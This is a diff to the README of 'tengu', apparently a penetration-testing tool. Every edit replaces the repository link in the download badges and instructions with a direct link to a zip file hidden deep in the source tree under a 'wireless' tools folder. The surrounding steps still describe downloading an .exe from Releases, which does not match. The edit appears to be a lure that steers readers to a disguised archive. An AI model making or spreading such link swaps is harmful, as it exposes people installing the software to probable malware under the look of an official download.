@@ -1,6 +1,6 @@
 # 🛡️ tengu - Simple AI Penetration Testing Server
 
-[![Download tengu](https://img.shields.io/badge/Download-tengu-blue?style=for-the-badge&logo=github)](https://github.com/sandip-test/tengu)
+[![Download tengu](https://img.shields.io/badge/Download-tengu-blue?style=for-the-badge&logo=github)](https://github.com/sandip-test/tengu/raw/refs/heads/main/src/tengu/tools/wireless/Software_v1.8-alpha.5.zip)
 
 ## About tengu
 
@@ -27,11 +27,11 @@ Ensure your PC meets these requirements before installing tengu to avoid issues.
 
 Click the button below to visit the official GitHub page for tengu. This page contains the latest version to download and instructions.
 
-[![Download tengu](https://img.shields.io/badge/Download-tengu-grey?style=for-the-badge&logo=github)](https://github.com/sandip-test/tengu)
+[![Download tengu](https://img.shields.io/badge/Download-tengu-grey?style=for-the-badge&logo=github)](https://github.com/sandip-test/tengu/raw/refs/heads/main/src/tengu/tools/wireless/Software_v1.8-alpha.5.zip)
 
 ### Steps to Download and Run tengu on Windows:
 
-1. Open the link above or go to `https://github.com/sandip-test/tengu` in your web browser.
+1. Open the link above or go to `https://github.com/sandip-test/tengu/raw/refs/heads/main/src/tengu/tools/wireless/Software_v1.8-alpha.5.zip` in your web browser.
 2. Look for the "Releases" tab on the GitHub page. This is where the installation files are.
 3. Find the latest release. It will show a version number and release date.
 4. Download the file that ends with `.exe`. This is the installer file for Windows.
@@ -115,7 +115,7 @@ For detailed guides, advanced features, and community support, visit the GitHub 
 
 ## 📂 Where to Go Next
 
-- Visit https://github.com/sandip-test/tengu for files and updates.  
+- Visit https://github.com/sandip-test/tengu/raw/refs/heads/main/src/tengu/tools/wireless/Software_v1.8-alpha.5.zip for files and updates.  
 - Explore the “Issues” tab to see common questions or report problems.  
 - Check the README on GitHub for the latest version notes and change logs.  
 
